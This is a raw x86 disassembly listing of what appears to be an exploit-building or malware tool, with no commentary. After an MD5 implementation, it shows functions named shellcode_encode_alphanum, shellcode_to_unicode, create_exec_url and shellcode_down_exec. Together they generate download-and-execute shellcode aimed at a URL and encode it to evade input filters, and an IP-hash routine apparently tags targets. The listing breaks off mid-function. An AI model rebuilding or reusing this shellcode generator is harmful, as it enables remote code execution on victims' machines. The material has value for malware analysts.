xor    eax,edi
and    eax,ebx
xor    eax,edi
add    eax,DWORD PTR [ebp-0x54]
mov    edx,DWORD PTR [ebp-0x60]
lea    edx,[eax+edx*1-0x173848aa]
rol    edx,0xc
mov    eax,ebx
add    edx,ebx
xor    eax,esi
and    eax,edx
xor    eax,esi
add    eax,DWORD PTR [ebp-0x50]
lea    edi,[eax+edi*1+0x242070db]
rol    edi,0x11
mov    eax,edx
add    edi,edx
xor    eax,ebx
and    eax,edi
xor    eax,ebx
add    eax,DWORD PTR [ebp-0x4c]
lea    esi,[eax+esi*1-0x3e423112]
rol    esi,0x16
mov    eax,edx
add    esi,edi
xor    eax,edi
and    eax,esi
xor    eax,edx
add    eax,DWORD PTR [ebp-0x48]
lea    ebx,[eax+ebx*1-0xa83f051]
rol    ebx,0x7
mov    eax,esi
add    ebx,esi
add    esp,0x10
xor    eax,edi
and    eax,ebx
xor    eax,edi
add    eax,DWORD PTR [ebp-0x44]
lea    edx,[eax+edx*1+0x4787c62a]
rol    edx,0xc
mov    eax,ebx
add    edx,ebx
xor    eax,esi
and    eax,edx
xor    eax,esi
add    eax,DWORD PTR [ebp-0x40]
lea    edi,[eax+edi*1-0x57cfb9ed]
rol    edi,0x11
mov    eax,edx
add    edi,edx
xor    eax,ebx
and    eax,edi
xor    eax,ebx
add    eax,DWORD PTR [ebp-0x3c]
lea    esi,[eax+esi*1-0x2b96aff]
rol    esi,0x16
mov    eax,edx
add    esi,edi
xor    eax,edi
and    eax,esi
xor    eax,edx
add    eax,DWORD PTR [ebp-0x38]
lea    ebx,[eax+ebx*1+0x698098d8]
rol    ebx,0x7
mov    eax,esi
add    ebx,esi
xor    eax,edi
and    eax,ebx
xor    eax,edi
add    eax,DWORD PTR [ebp-0x34]
lea    edx,[eax+edx*1-0x74bb0851]
rol    edx,0xc
mov    eax,ebx
add    edx,ebx
xor    eax,esi
and    eax,edx
xor    eax,esi
add    eax,DWORD PTR [ebp-0x30]
lea    edi,[eax+edi*1-0xa44f]
rol    edi,0x11
mov    eax,edx
add    edi,edx
xor    eax,ebx
and    eax,edi
xor    eax,ebx
add    eax,DWORD PTR [ebp-0x2c]
lea    esi,[eax+esi*1-0x76a32842]
rol    esi,0x16
mov    eax,edx
add    esi,edi
xor    eax,edi
and    eax,esi
mov    ecx,DWORD PTR [ebp-0x28]
xor    eax,edx
add    eax,ecx
lea    ebx,[eax+ebx*1+0x6b901122]
rol    ebx,0x7
mov    eax,esi
add    ebx,esi
xor    eax,edi
and    eax,ebx
xor    eax,edi
add    eax,DWORD PTR [ebp-0x24]
lea    edx,[eax+edx*1-0x2678e6d]
rol    edx,0xc
mov    eax,ebx
add    edx,ebx
xor    eax,esi
and    eax,edx
xor    eax,esi
add    eax,DWORD PTR [ebp-0x20]
lea    edi,[eax+edi*1-0x5986bc72]
rol    edi,0x11
mov    eax,edx
add    edi,edx
xor    eax,ebx
and    eax,edi
xor    eax,ebx
add    eax,DWORD PTR [ebp-0x1c]
lea    esi,[eax+esi*1+0x49b40821]
rol    esi,0x16
add    esi,edi
mov    eax,esi
xor    eax,edi
and    eax,edx
xor    eax,edi
add    eax,DWORD PTR [ebp-0x54]
lea    ebx,[eax+ebx*1-0x9e1da9e]
rol    ebx,0x5
add    ebx,esi
mov    eax,ebx
xor    eax,esi
and    eax,edi
xor    eax,esi
add    eax,DWORD PTR [ebp-0x40]
lea    edx,[eax+edx*1-0x3fbf4cc0]
rol    edx,0x9
add    edx,ebx
mov    eax,edx
xor    eax,ebx
and    eax,esi
xor    eax,ebx
add    eax,DWORD PTR [ebp-0x2c]
lea    edi,[eax+edi*1+0x265e5a51]
rol    edi,0xe
add    edi,edx
mov    eax,edx
xor    eax,edi
and    eax,ebx
xor    eax,edx
add    eax,DWORD PTR [ebp-0x58]
lea    esi,[eax+esi*1-0x16493856]
rol    esi,0x14
add    esi,edi
mov    eax,esi
xor    eax,edi
and    eax,edx
xor    eax,edi
add    eax,DWORD PTR [ebp-0x44]
lea    ebx,[eax+ebx*1-0x29d0efa3]
rol    ebx,0x5
add    ebx,esi
mov    eax,ebx
xor    eax,esi
and    eax,edi
xor    eax,esi
add    eax,DWORD PTR [ebp-0x30]
lea    edx,[eax+edx*1+0x2441453]
rol    edx,0x9
add    edx,ebx
mov    eax,edx
xor    eax,ebx
and    eax,esi
xor    eax,ebx
add    eax,DWORD PTR [ebp-0x1c]
lea    edi,[eax+edi*1-0x275e197f]
rol    edi,0xe
add    edi,edx
mov    eax,edx
xor    eax,edi
and    eax,ebx
xor    eax,edx
add    eax,DWORD PTR [ebp-0x48]
lea    esi,[eax+esi*1-0x182c0438]
rol    esi,0x14
add    esi,edi
mov    eax,esi
xor    eax,edi
and    eax,edx
xor    eax,edi
add    eax,DWORD PTR [ebp-0x34]
lea    ebx,[eax+ebx*1+0x21e1cde6]
rol    ebx,0x5
add    ebx,esi
mov    eax,ebx
xor    eax,esi
and    eax,edi
xor    eax,esi
add    eax,DWORD PTR [ebp-0x20]
lea    edx,[eax+edx*1-0x3cc8f82a]
rol    edx,0x9
add    edx,ebx
mov    eax,edx
xor    eax,ebx
and    eax,esi
xor    eax,ebx
add    eax,DWORD PTR [ebp-0x4c]
lea    edi,[eax+edi*1-0xb2af279]
rol    edi,0xe
add    edi,edx
mov    eax,edx
xor    eax,edi
and    eax,ebx
xor    eax,edx
add    eax,DWORD PTR [ebp-0x38]
lea    esi,[eax+esi*1+0x455a14ed]
rol    esi,0x14
add    esi,edi
mov    eax,esi
xor    eax,edi
and    eax,edx
xor    eax,edi
add    eax,DWORD PTR [ebp-0x24]
lea    ebx,[eax+ebx*1-0x561c16fb]
rol    ebx,0x5
add    ebx,esi
mov    eax,ebx
xor    eax,esi
and    eax,edi
xor    eax,esi
add    eax,DWORD PTR [ebp-0x50]
lea    edx,[eax+edx*1-0x3105c08]
rol    edx,0x9
add    edx,ebx
mov    eax,edx
xor    eax,ebx
and    eax,esi
xor    eax,ebx
add    eax,DWORD PTR [ebp-0x3c]
lea    edi,[eax+edi*1+0x676f02d9]
rol    edi,0xe
add    edi,edx
mov    eax,edx
xor    eax,edi
and    eax,ebx
xor    eax,edx
add    eax,ecx
lea    esi,[eax+esi*1-0x72d5b376]
rol    esi,0x14
add    esi,edi
mov    eax,esi
xor    eax,edi
xor    eax,edx
add    eax,DWORD PTR [ebp-0x44]
lea    ebx,[eax+ebx*1-0x5c6be]
rol    ebx,0x4
add    ebx,esi
mov    eax,ebx
xor    eax,esi
xor    eax,edi
add    eax,DWORD PTR [ebp-0x38]
lea    edx,[eax+edx*1-0x788e097f]
rol    edx,0xb
add    edx,ebx
mov    eax,edx
xor    eax,ebx
xor    eax,esi
add    eax,DWORD PTR [ebp-0x2c]
lea    edi,[eax+edi*1+0x6d9d6122]
rol    edi,0x10
add    edi,edx
mov    eax,edx
xor    eax,edi
xor    eax,ebx
add    eax,DWORD PTR [ebp-0x20]
lea    esi,[eax+esi*1-0x21ac7f4]
rol    esi,0x17
add    esi,edi
mov    eax,esi
xor    eax,edi
xor    eax,edx
add    eax,DWORD PTR [ebp-0x54]
lea    ebx,[eax+ebx*1-0x5b4115bc]
rol    ebx,0x4
add    ebx,esi
mov    eax,ebx
xor    eax,esi
xor    eax,edi
add    eax,DWORD PTR [ebp-0x48]
lea    edx,[eax+edx*1+0x4bdecfa9]
rol    edx,0xb
add    edx,ebx
mov    eax,edx
xor    eax,ebx
xor    eax,esi
add    eax,DWORD PTR [ebp-0x3c]
lea    edi,[eax+edi*1-0x944b4a0]
rol    edi,0x10
add    edi,edx
mov    eax,edx
xor    eax,edi
xor    eax,ebx
add    eax,DWORD PTR [ebp-0x30]
lea    esi,[eax+esi*1-0x41404390]
rol    esi,0x17
add    esi,edi
mov    eax,esi
xor    eax,edi
xor    eax,edx
add    eax,DWORD PTR [ebp-0x24]
lea    ebx,[eax+ebx*1+0x289b7ec6]
rol    ebx,0x4
add    ebx,esi
mov    eax,ebx
xor    eax,esi
xor    eax,edi
add    eax,DWORD PTR [ebp-0x58]
lea    edx,[eax+edx*1-0x155ed806]
rol    edx,0xb
add    edx,ebx
mov    eax,edx
xor    eax,ebx
xor    eax,esi
add    eax,DWORD PTR [ebp-0x4c]
lea    edi,[eax+edi*1-0x2b10cf7b]
rol    edi,0x10
add    edi,edx
mov    eax,edx
xor    eax,edi
xor    eax,ebx
add    eax,DWORD PTR [ebp-0x40]
lea    esi,[eax+esi*1+0x4881d05]
rol    esi,0x17
add    esi,edi
mov    eax,esi
xor    eax,edi
xor    eax,edx
add    eax,DWORD PTR [ebp-0x34]
lea    ebx,[eax+ebx*1-0x262b2fc7]
rol    ebx,0x4
add    ebx,esi
mov    eax,ebx
xor    eax,esi
xor    eax,edi
add    eax,ecx
lea    edx,[eax+edx*1-0x1924661b]
rol    edx,0xb
add    edx,ebx
mov    eax,edx
xor    eax,ebx
xor    eax,esi
add    eax,DWORD PTR [ebp-0x1c]
lea    edi,[eax+edi*1+0x1fa27cf8]
rol    edi,0x10
add    edi,edx
mov    eax,edx
xor    eax,edi
xor    eax,ebx
add    eax,DWORD PTR [ebp-0x50]
lea    esi,[eax+esi*1-0x3b53a99b]
rol    esi,0x17
mov    eax,edx
add    esi,edi
not    eax
or     eax,esi
xor    eax,edi
add    eax,DWORD PTR [ebp-0x58]
lea    ebx,[eax+ebx*1-0xbd6ddbc]
rol    ebx,0x6
mov    eax,edi
add    ebx,esi
not    eax
or     eax,ebx
xor    eax,esi
add    eax,DWORD PTR [ebp-0x3c]
lea    edx,[eax+edx*1+0x432aff97]
rol    edx,0xa
mov    eax,esi
add    edx,ebx
not    eax
or     eax,edx
xor    eax,ebx
add    eax,DWORD PTR [ebp-0x20]
lea    edi,[eax+edi*1-0x546bdc59]
rol    edi,0xf
mov    eax,ebx
add    edi,edx
not    eax
or     eax,edi
xor    eax,edx
add    eax,DWORD PTR [ebp-0x44]
lea    esi,[eax+esi*1-0x36c5fc7]
rol    esi,0x15
mov    eax,edx
add    esi,edi
not    eax
or     eax,esi
xor    eax,edi
add    eax,ecx
lea    ebx,[eax+ebx*1+0x655b59c3]
rol    ebx,0x6
mov    eax,edi
add    ebx,esi
not    eax
or     eax,ebx
xor    eax,esi
add    eax,DWORD PTR [ebp-0x4c]
lea    edx,[eax+edx*1-0x70f3336e]
rol    edx,0xa
mov    eax,esi
add    edx,ebx
not    eax
or     eax,edx
xor    eax,ebx
add    eax,DWORD PTR [ebp-0x30]
lea    edi,[eax+edi*1-0x100b83]
rol    edi,0xf
mov    eax,ebx
add    edi,edx
not    eax
or     eax,edi
xor    eax,edx
add    eax,DWORD PTR [ebp-0x54]
lea    esi,[eax+esi*1-0x7a7ba22f]
rol    esi,0x15
mov    eax,edx
add    esi,edi
not    eax
or     eax,esi
xor    eax,edi
add    eax,DWORD PTR [ebp-0x38]
lea    ebx,[eax+ebx*1+0x6fa87e4f]
rol    ebx,0x6
mov    eax,edi
add    ebx,esi
not    eax
or     eax,ebx
xor    eax,esi
add    eax,DWORD PTR [ebp-0x1c]
lea    edx,[eax+edx*1-0x1d31920]
rol    edx,0xa
mov    eax,esi
add    edx,ebx
not    eax
or     eax,edx
xor    eax,ebx
add    eax,DWORD PTR [ebp-0x40]
lea    edi,[eax+edi*1-0x5cfebcec]
rol    edi,0xf
mov    eax,ebx
add    edi,edx
not    eax
or     eax,edi
xor    eax,edx
add    eax,DWORD PTR [ebp-0x24]
lea    esi,[eax+esi*1+0x4e0811a1]
rol    esi,0x15
mov    eax,edx
add    esi,edi
not    eax
or     eax,esi
xor    eax,edi
add    eax,DWORD PTR [ebp-0x48]
lea    ebx,[eax+ebx*1-0x8ac817e]
rol    ebx,0x6
mov    eax,edi
add    ebx,esi
not    eax
or     eax,ebx
xor    eax,esi
add    eax,DWORD PTR [ebp-0x2c]
lea    edx,[eax+edx*1-0x42c50dcb]
rol    edx,0xa
mov    eax,esi
mov    DWORD PTR [ebp-0x60],edx
not    eax
add    edx,ebx
or     eax,edx
xor    eax,ebx
add    eax,DWORD PTR [ebp-0x50]
lea    edi,[eax+edi*1+0x2ad7d2bb]
rol    edi,0xf
mov    eax,ebx
add    edi,edx
not    eax
or     eax,edi
xor    eax,edx
add    eax,DWORD PTR [ebp-0x34]
lea    esi,[eax+esi*1-0x14792c6f]
rol    esi,0x15
mov    eax,DWORD PTR [ebp-0x5c]
add    esi,edi
add    DWORD PTR [eax],ebx
add    DWORD PTR [eax+0x4],esi
add    DWORD PTR [eax+0x8],edi
add    DWORD PTR [eax+0xc],edx
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0xc
mov    edi,DWORD PTR [ebp+0x8]
cmp    DWORD PTR [edi+0x54],0x40
mov    esi,DWORD PTR [ebp+0xc]
mov    ebx,DWORD PTR [ebp+0x10]
je     804ccec <md5_write+0xc0>
test   esi,esi
je     804cce4 <md5_write+0xb8>
mov    eax,DWORD PTR [edi+0x54]
test   eax,eax
je     804cc8e <md5_write+0x62>
test   ebx,ebx
je     804cc7c <md5_write+0x50>
cmp    eax,0x3f
jg     804cc7c <md5_write+0x50>
lea    edx,[eax+0x1]
nop
mov    al,BYTE PTR [esi]
inc    esi
dec    ebx
mov    BYTE PTR [edx+edi*1+0x13],al
mov    DWORD PTR [edi+0x54],edx
mov    eax,edx
je     804cc7c <md5_write+0x50>
inc    edx
cmp    eax,0x3f
jle    804cc64 <md5_write+0x38>
lea    esi,[esi+0x0]
push   eax
push   0x0
push   0x0
push   edi
call   804cc2c <md5_write>
add    esp,0x10
test   ebx,ebx
je     804cce4 <md5_write+0xb8>
cmp    ebx,0x3f
jbe    804ccb2 <md5_write+0x86>
nop
mov    edx,esi
mov    eax,edi
call   804c644 <transform>
sub    ebx,0x40
mov    DWORD PTR [edi+0x54],0x0
inc    DWORD PTR [edi+0x10]
add    esi,0x40
cmp    ebx,0x3f
ja     804cc94 <md5_write+0x68>
mov    eax,0x68
call   804c618 <burn_stack>
test   ebx,ebx
je     804cce4 <md5_write+0xb8>
mov    eax,DWORD PTR [edi+0x54]
cmp    eax,0x3f
jg     804cce4 <md5_write+0xb8>
lea    edx,[eax+0x1]
nop
mov    al,BYTE PTR [esi]
inc    esi
dec    ebx
mov    BYTE PTR [edx+edi*1+0x13],al
mov    DWORD PTR [edi+0x54],edx
mov    eax,edx
je     804cce4 <md5_write+0xb8>
inc    edx
cmp    eax,0x3f
jle    804cccc <md5_write+0xa0>
lea    esi,[esi+0x0]
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
ret    
lea    edx,[edi+0x14]
mov    eax,edi
call   804c644 <transform>
mov    eax,0x68
call   804c618 <burn_stack>
inc    DWORD PTR [edi+0x10]
mov    DWORD PTR [edi+0x54],0x0
jmp    804cc48 <md5_write+0x1c>
nop
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x10
push   0x0
mov    esi,DWORD PTR [ebp+0x8]
push   0x0
push   esi
call   804cc2c <md5_write>
mov    edx,DWORD PTR [esi+0x10]
mov    ebx,edx
shl    ebx,0x6
shr    edx,0x1a
mov    ecx,DWORD PTR [esi+0x54]
mov    DWORD PTR [ebp-0x10],edx
mov    edx,ebx
add    ebx,ecx
add    esp,0x10
cmp    ebx,edx
adc    DWORD PTR [ebp-0x10],0x0
mov    eax,ebx
shl    DWORD PTR [ebp-0x10],0x3
shr    eax,0x1d
shl    ebx,0x3
or     DWORD PTR [ebp-0x10],eax
cmp    ecx,0x37
jg     804cd80 <md5_final+0x70>
lea    eax,[ecx+0x1]
cmp    eax,0x37
mov    BYTE PTR [ecx+esi*1+0x14],0x80
jg     804cd77 <md5_final+0x67>
lea    edx,[ecx+0x2]
mov    eax,edx
cmp    eax,0x37
mov    BYTE PTR [edx+esi*1+0x13],0x0
lea    edx,[edx+0x1]
jle    804cd68 <md5_final+0x58>
lea    edx,[esi+0x14]
mov    DWORD PTR [esi+0x54],eax
jmp    804cdbf <md5_final+0xaf>
nop
lea    eax,[ecx+0x1]
cmp    eax,0x3f
mov    BYTE PTR [ecx+esi*1+0x14],0x80
jg     804cd9f <md5_final+0x8f>
lea    edx,[ecx+0x2]
mov    eax,edx
cmp    eax,0x3f
mov    BYTE PTR [edx+esi*1+0x13],0x0
lea    edx,[edx+0x1]
jle    804cd90 <md5_final+0x80>
mov    DWORD PTR [esi+0x54],eax
push   edx
push   0x0
push   0x0
push   esi
call   804cc2c <md5_write>
lea    edx,[esi+0x14]
cld    
mov    ecx,0xe
xor    eax,eax
mov    edi,edx
rep stos DWORD PTR es:[edi],eax
add    esp,0x10
mov    BYTE PTR [esi+0x4c],bl
shr    ebx,0x8
mov    BYTE PTR [esi+0x4d],bl
shr    ebx,0x8
mov    BYTE PTR [esi+0x4e],bl
shr    ebx,0x8
mov    BYTE PTR [esi+0x4f],bl
mov    al,BYTE PTR [ebp-0x10]
mov    BYTE PTR [esi+0x50],al
shr    DWORD PTR [ebp-0x10],0x8
mov    al,BYTE PTR [ebp-0x10]
mov    BYTE PTR [esi+0x51],al
mov    BYTE PTR [esi+0x52],0x0
mov    eax,esi
mov    BYTE PTR [esi+0x53],0x0
call   804c644 <transform>
mov    eax,0x68
call   804c618 <burn_stack>
mov    eax,DWORD PTR [esi]
mov    DWORD PTR [esi+0x14],eax
mov    eax,DWORD PTR [esi+0x4]
mov    DWORD PTR [esi+0x18],eax
mov    eax,DWORD PTR [esi+0x8]
mov    DWORD PTR [esi+0x1c],eax
mov    eax,DWORD PTR [esi+0xc]
mov    DWORD PTR [esi+0x20],eax
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
ret    
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x28
mov    ebx,DWORD PTR [ebp+0xc]
mov    eax,DWORD PTR [ebx]
mov    DWORD PTR [ebp-0x1c],eax
lea    eax,[eax+eax*1+0x1d]
mov    DWORD PTR [ebx],eax
push   eax
mov    DWORD PTR [ebp-0x18],0x0
call   804d878 <xmalloc>
mov    esi,0x804f069
cld    
mov    ecx,0x7
mov    edi,eax
dec    DWORD PTR [ebx]
mov    DWORD PTR [ebp-0x20],eax
rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
mov    edx,DWORD PTR [ebp-0x1c]
add    esp,0x10
cmp    DWORD PTR [ebp-0x18],edx
jge    804cf80 <shellcode_encode_alphanum+0x164>
lea    ecx,[ebp-0x10]
mov    DWORD PTR [ebp-0x24],ecx
mov    esi,esi
mov    edx,DWORD PTR [ebp+0x8]
mov    ecx,DWORD PTR [ebp-0x18]
movzx  eax,BYTE PTR [edx+ecx*1]
mov    ebx,eax
mov    esi,eax
call   8048dcc <rand@plt>
mov    edx,eax
cld    
xor    eax,eax
mov    ecx,0xffffffff
mov    edi,0x804f094
repnz scas al,BYTE PTR es:[edi]
not    ecx
dec    ecx
mov    eax,edx
xor    edx,edx
div    ecx
movsx  eax,BYTE PTR [edx+0x804f094]
and    esi,0xf
and    eax,0xf
shr    ebx,0x4
cmp    eax,esi
je     804ced5 <shellcode_encode_alphanum+0xb9>
mov    ecx,0xffffffff
mov    edi,0x804f094
xor    eax,eax
repnz scas al,BYTE PTR es:[edi]
not    ecx
dec    ecx
mov    esi,esi
inc    edx
mov    eax,edx
xor    edx,edx
div    ecx
movsx  eax,BYTE PTR [edx+0x804f094]
and    eax,0xf
cmp    eax,esi
jne    804cec0 <shellcode_encode_alphanum+0xa4>
mov    al,BYTE PTR [edx+0x804f094]
sar    al,0x4
movsx  eax,al
xor    ebx,eax
mov    DWORD PTR [ebp-0x14],eax
call   8048dcc <rand@plt>
mov    edx,eax
cld    
xor    eax,eax
mov    ecx,0xffffffff
mov    edi,0x804f094
repnz scas al,BYTE PTR es:[edi]
not    ecx
dec    ecx
mov    eax,edx
xor    edx,edx
div    ecx
movsx  eax,BYTE PTR [edx+0x804f094]
and    eax,0xf
cmp    eax,ebx
je     804cf39 <shellcode_encode_alphanum+0x11d>
mov    ecx,0xffffffff
mov    edi,0x804f094
xor    eax,eax
repnz scas al,BYTE PTR es:[edi]
not    ecx
dec    ecx
inc    edx
mov    eax,edx
xor    edx,edx
div    ecx
movsx  eax,BYTE PTR [edx+0x804f094]
and    eax,0xf
cmp    eax,ebx
jne    804cf24 <shellcode_encode_alphanum+0x108>
shl    DWORD PTR [ebp-0x14],0x4
movsx  eax,BYTE PTR [edx+0x804f094]
mov    edx,DWORD PTR [ebp-0x14]
add    edx,esi
and    eax,0xfffffff0
push   edx
add    eax,ebx
push   eax
push   0x804f086
push   DWORD PTR [ebp-0x24]
call   8048edc <sprintf@plt>
pop    eax
pop    edx
lea    edx,[ebp-0x10]
push   edx
push   DWORD PTR [ebp-0x20]
mov    DWORD PTR [ebp-0x24],edx
call   8048d8c <strcat@plt>
inc    DWORD PTR [ebp-0x18]
mov    eax,DWORD PTR [ebp-0x1c]
add    esp,0x10
cmp    DWORD PTR [ebp-0x18],eax
jl     804ce6c <shellcode_encode_alphanum+0x50>
mov    eax,DWORD PTR [ebp-0x20]
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
ret    
nop
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x18
mov    eax,DWORD PTR [ebp+0x14]
mov    DWORD PTR [ebp-0x10],eax
mov    edi,DWORD PTR [ebp+0x10]
cld    
xor    eax,eax
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
mov    edx,DWORD PTR [ebp+0xc]
not    ecx
lea    ebx,[ecx-0x1]
add    ecx,DWORD PTR [edx]
push   ecx
call   8048cec <malloc@plt>
mov    esi,eax
add    esp,0xc
mov    eax,DWORD PTR [ebp+0xc]
push   DWORD PTR [eax]
push   DWORD PTR [ebp+0x8]
push   esi
call   8048ccc <memcpy@plt>
add    esp,0xc
mov    edx,DWORD PTR [ebp+0xc]
mov    eax,DWORD PTR [edx]
push   ebx
push   DWORD PTR [ebp+0x10]
add    eax,esi
push   eax
call   8048ccc <memcpy@plt>
mov    eax,DWORD PTR [ebp+0xc]
add    ebx,DWORD PTR [eax]
mov    dl,BYTE PTR [ebp-0x10]
mov    BYTE PTR [ebx+esi*1],dl
inc    ebx
mov    DWORD PTR [eax],ebx
lea    esp,[ebp-0xc]
pop    ebx
mov    eax,esi
pop    esi
pop    edi
leave  
ret    
nop
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x18
mov    edx,DWORD PTR [ebp+0xc]
mov    eax,DWORD PTR [edx]
lea    edx,[eax+eax*2]
shr    eax,0x4
lea    eax,[eax+eax*4]
lea    eax,[edx+eax*2+0x400]
push   eax
call   804d878 <xmalloc>
mov    edx,DWORD PTR [ebp+0xc]
mov    ebx,eax
mov    eax,DWORD PTR [edx]
lea    edx,[eax+eax*2]
shr    eax,0x4
lea    eax,[eax+eax*4]
add    esp,0xc
lea    eax,[edx+eax*2+0x400]
push   eax
push   0x0
push   ebx
call   8048e5c <memset@plt>
mov    eax,DWORD PTR [ebp+0xc]
mov    edi,DWORD PTR [eax]
xor    esi,esi
add    esp,0x10
test   edi,edi
jne    804d0a7 <shellcode_to_unicode+0xaf>
jmp    804d0cc <shellcode_to_unicode+0xd4>
nop
cld    
mov    ecx,0xffffffff
mov    edi,ebx
xor    eax,eax
repnz scas al,BYTE PTR es:[edi]
not    ecx
mov    DWORD PTR [ecx+ebx*1-0x1],0xa2b2022
mov    WORD PTR [ecx+ebx*1+0x3],0x22
lea    esi,[esi+0x0]
mov    eax,esi
mov    edx,DWORD PTR [ebp+0x8]
shr    eax,1
push   ecx
movzx  eax,WORD PTR [edx+eax*2]
push   eax
push   0x804f08b
xor    eax,eax
cld    
mov    ecx,0xffffffff
mov    edi,ebx
repnz scas al,BYTE PTR es:[edi]
not    ecx
lea    ecx,[ecx+ebx*1-0x1]
push   ecx
call   8048edc <sprintf@plt>
add    esi,0x2
mov    edx,DWORD PTR [ebp+0xc]
add    esp,0x10
cmp    DWORD PTR [edx],esi
jbe    804d0cc <shellcode_to_unicode+0xd4>
test   esi,0xf
jne    804d070 <shellcode_to_unicode+0x78>
test   esi,esi
jne    804d050 <shellcode_to_unicode+0x58>
cld    
mov    ecx,0xffffffff
mov    edi,ebx
xor    eax,eax
repnz scas al,BYTE PTR es:[edi]
not    ecx
mov    WORD PTR [ecx+ebx*1-0x1],0x22
jmp    804d070 <shellcode_to_unicode+0x78>
mov    esi,esi
mov    edx,0xffffffff
xor    eax,eax
mov    edi,ebx
cld    
mov    ecx,edx
repnz scas al,BYTE PTR es:[edi]
not    ecx
mov    BYTE PTR [ecx+ebx*1-0x1],0x22
mov    edi,ebx
mov    ecx,edx
repnz scas al,BYTE PTR es:[edi]
not    ecx
mov    eax,DWORD PTR [ebp+0xc]
dec    ecx
mov    DWORD PTR [eax],ecx
lea    esp,[ebp-0xc]
mov    eax,ebx
pop    ebx
pop    esi
pop    edi
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
sub    esp,0x14
push   DWORD PTR [ebp+0x8]
call   8048cac <__inet_addr@plt>
xor    ah,0x1
mov    DWORD PTR [ebp-0x4],eax
pop    eax
pop    edx
push   0x4
lea    eax,[ebp-0x4]
push   eax
call   804a318 <Crc32Str>
leave  
ret    
nop
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x18
mov    ebx,DWORD PTR [ebp+0x8]
mov    al,BYTE PTR [ebp+0xc]
mov    edi,DWORD PTR [ebx+0xc]
mov    BYTE PTR [ebp-0xd],al
cld    
xor    eax,eax
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
not    ecx
add    ecx,0x1ff
push   ecx
call   804d878 <xmalloc>
add    esp,0xc
push   DWORD PTR [ebp+0x10]
push   DWORD PTR [ebx+0x4]
push   DWORD PTR [ebx+0x20]
mov    esi,eax
call   804d0fc <get_ip_hash>
mov    DWORD PTR [esp],eax
push   DWORD PTR [ebp+0x14]
movzx  eax,BYTE PTR [ebp-0xd]
push   eax
movzx  eax,WORD PTR [ebx+0x2]
push   eax
movzx  eax,BYTE PTR [ebx+0x1]
push   eax
movzx  eax,BYTE PTR [ebx]
push   eax
push   DWORD PTR [ebx+0xc]
push   0x804f0d4
push   esi
call   8048edc <sprintf@plt>
lea    esp,[ebp-0xc]
pop    ebx
mov    eax,esi
pop    esi
pop    edi
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0xc
mov    edi,DWORD PTR [ebp+0xc]
mov    bl,BYTE PTR [ebp+0x10]
push   DWORD PTR [ebp+0x24]
push   DWORD PTR [ebp+0x20]
movzx  eax,BYTE PTR [ebp+0x1c]
push   eax
push   DWORD PTR [ebp+0x18]
movzx  ebx,bl
call   804d120 <create_exec_url>
push   ebx
push   eax
push   edi
push   DWORD PTR [ebp+0x8]
call   804cf8c <shellcode_add_url>
add    esp,0x20
test   DWORD PTR [ebp+0x14],0x40000000
mov    ebx,eax
jne    804d1e4 <shellcode_down_exec+0x50>
mov    ecx,DWORD PTR [ebp+0x14]
test   ecx,ecx
js     804d204 <shellcode_down_exec+0x70>
lea    esp,[ebp-0xc]
mov    eax,ebx
pop    ebx
pop    esi
pop    edi
leave  
ret    
nop
sub    esp,0x8
push   edi
push   eax
call   804ce1c <shellcode_encode_alphanum>
mov    DWORD PTR [esp],ebx
mov    esi,eax
call   8048f8c <free@plt>
mov    ecx,DWORD PTR [ebp+0x14]
add    esp,0x10
test   ecx,ecx
mov    ebx,esi
jns    804d1d9 <shellcode_down_exec+0x45>
sub    esp,0x8
push   edi
push   ebx
call   804cff8 <shellcode_to_unicode>
mov    esi,eax
mov    DWORD PTR [esp],ebx
call   8048f8c <free@plt>
mov    ebx,esi
add    esp,0x10
lea    esp,[ebp-0xc]
mov    eax,ebx
pop    ebx
pop    esi
pop    edi
leave  
ret    
nop
push   ebp
mov    ebp,esp
push   esi
push   ebx
sub    esp,0x40
mov    esi,DWORD PTR [ebp+0xc]
test   esi,esi
mov    ebx,DWORD PTR [ebp+0x8]
jne    804d280 <print_headers+0x58>
sub    esp,0xc
test   ebx,ebx
mov    eax,0x804e01d
je     804d2a0 <print_headers+0x78>
test   ebx,ebx
push   eax
mov    eax,ebx
je     804d2ac <print_headers+0x84>
test   ebx,ebx
push   eax
mov    eax,0x804f0f7
je     804d2bc <print_headers+0x94>
test   esi,esi
push   eax
mov    eax,0x804e01f
je     804d264 <print_headers+0x3c>
lea    eax,[ebp-0x48]
push   eax
push   0x804f188
call   8048c2c <printf@plt>
mov    DWORD PTR ds:0x80559c0,0x1
lea    esp,[ebp-0x8]
pop    ebx
pop    esi
leave  
ret    
push   eax
push   esi
push   0x804f106
lea    eax,[ebp-0x48]
push   eax
call   8048edc <sprintf@plt>
add    esp,0x10
sub    esp,0xc
test   ebx,ebx
mov    eax,0x804e01d
jne    804d246 <print_headers+0x1e>
nop
mov    eax,0x804e01f
test   ebx,ebx
push   eax
mov    eax,ebx
jne    804d24d <print_headers+0x25>
mov    eax,0x804e01f
test   ebx,ebx
push   eax
mov    eax,0x804f0f7
jne    804d257 <print_headers+0x2f>
nop
mov    eax,0x804e01f
jmp    804d257 <print_headers+0x2f>
nop
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x8
mov    edx,0xffffffff
xor    eax,eax
mov    edi,DWORD PTR [ebp+0x8]
cld    
mov    ecx,edx
repnz scas al,BYTE PTR es:[edi]
not    ecx
lea    ebx,[ecx-0x1]
mov    edi,DWORD PTR [ebp+0xc]
